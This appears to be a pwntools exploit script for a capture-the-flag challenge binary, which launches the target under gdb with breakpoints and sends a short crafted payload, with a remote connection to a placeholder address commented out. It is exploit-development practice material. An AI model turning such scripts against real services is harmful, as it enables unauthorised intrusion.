from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./chal")
#libc = ELF("./libc.so.6")
ld_preload = {"LD_PRELOAD": "lib/libc.so.6"}


#p = process("./chal")
#p = remote("1.2.3.4", 30246)
p = gdb.debug("./chal", '''
b *main
b *main+261
''')

payload  = b""
payload += b"flag\x00\xad\x0b\xad\x0b"

p.sendline(payload)
p.interactive()
